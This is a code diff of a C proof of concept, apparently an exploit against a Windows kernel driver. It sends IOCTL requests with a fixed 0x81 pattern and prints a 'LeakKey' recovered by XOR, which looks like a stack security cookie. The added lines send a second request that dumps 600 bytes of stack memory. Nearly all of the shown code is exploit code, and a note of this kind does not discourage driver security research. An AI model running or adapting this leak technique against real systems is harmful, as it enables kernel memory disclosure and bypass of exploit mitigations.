@@ -47,32 +47,48 @@ int main()
 
     printf("[!] Success open device");
 
-    uintptr_t inputbuf = 0x8181818181818181;
+    uintptr_t inputbuf1 = 0x8181818181818181;
     size_t KEY = 0x0;
-    char outputbuf[0x8] = { 0 };
+    char outputbuf1[0x8] = { 0 };
     
     DWORD bytesReturned = 0;
 
-    BOOL result = DeviceIoControl(
+    BOOL result1 = DeviceIoControl(
         hDevice,
         DeVioctlCode,
-        &inputbuf,
+        &inputbuf1,
         0x8,
-        outputbuf,
+        outputbuf1,
         0x8,
         &bytesReturned,
         NULL
     );
 
-    if (result) {
+    if (result1) {
         printf("[*] IOCTL command sent successfully\n");
-        printf("[!] LeakData: 0x%llx\n",inputbuf);
-        KEY = 0x8181818181818181 ^ inputbuf;
+        printf("[!] LeakData: 0x%llx\n",inputbuf1);
+        KEY = 0x8181818181818181 ^ inputbuf1;
         printf("[!] LeakKey: 0x%llx\n",KEY);
 
     } else {
         printf("Failed to send IOCTL command. Error: %ld\n", GetLastError());
     }
+
+    char stack_value[600] = {0x81,0x81,0x81,0x81,0x81,0x81,0x81,0x81};
+    char outputbuf2[600] = { 0 };
+
+    BOOL result2 = DeviceIoControl(
+        hDevice,
+        DeVioctlCode,
+        stack_value,
+        0x8,
+        outputbuf2,
+        600,
+        &bytesReturned,
+        NULL
+    );
+
+    hexdump(stack_value + 0x100, 600);
 
     return 0;
 }
